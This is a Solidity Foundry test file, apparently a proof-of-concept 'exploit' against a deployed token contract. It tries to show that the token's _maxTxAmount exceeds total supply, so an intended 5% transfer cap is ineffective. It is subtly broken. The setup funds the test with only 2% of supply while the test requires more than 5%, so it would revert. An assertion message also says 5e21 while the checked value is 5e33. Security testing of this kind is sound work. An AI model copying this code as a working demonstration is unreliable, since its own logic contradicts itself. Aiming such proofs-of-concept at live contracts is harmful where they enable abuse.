// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface QAPToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x1EB68d088fD07D15b481DbaF219AC2aB61A6c073;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we just need to get some tokens
        // The test framework will already have TARGET defined
        // We'll use deal() to give ourselves tokens
        uint256 totalSupply = QAPToken(TARGET).totalSupply();
        // Give attacker 2% of total supply to work with
        uint256 attackerInitialBalance = totalSupply * 2 / 100;
        deal(TARGET, address(this), attackerInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Demonstrate the transaction limit bypass
        QAPToken token = QAPToken(TARGET);

        // Get the actual _maxTxAmount value
        uint256 maxTxAmount = token._maxTxAmount();

        // Calculate what 5% of total supply would be (the intended limit)
        uint256 totalSupply = token.totalSupply();
        uint256 fivePercent = totalSupply * 5 / 100;

        console.log("Total supply:", totalSupply);
        console.log("Actual _maxTxAmount:", maxTxAmount);
        console.log("5% of total supply (intended limit):", fivePercent);

        // Show that maxTxAmount is much larger than total supply
        require(maxTxAmount > totalSupply, "maxTxAmount should be larger than total supply");

        // Transfer an amount greater than 5% of supply but less than maxTxAmount
        address recipient = address(0x123);
        uint256 transferAmount = fivePercent + 1; // Just over 5%

        // Verify we have enough balance
        uint256 attackerBalance = token.balanceOf(address(this));
        require(attackerBalance >= transferAmount, "Insufficient balance for test");

        // Perform the transfer - should succeed despite exceeding intended 5% limit
        uint256 recipientBalanceBefore = token.balanceOf(recipient);
        token.transfer(recipient, transferAmount);

        // Verify the transfer worked
        uint256 recipientBalanceAfter = token.balanceOf(recipient);
        require(recipientBalanceAfter == recipientBalanceBefore + transferAmount, "Transfer failed");

        console.log("Successfully transferred", transferAmount, "tokens, which exceeds 5% of supply");
        console.log("This demonstrates the transaction limit is ineffective");

        // Oracle verification: check that _maxTxAmount equals the expected value
        assertEq(maxTxAmount, 5000000000000000000000000000000000, "_maxTxAmount should equal 5e21");
        assertEq(token._maxTxAmount(), 5000000000000000000000000000000000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
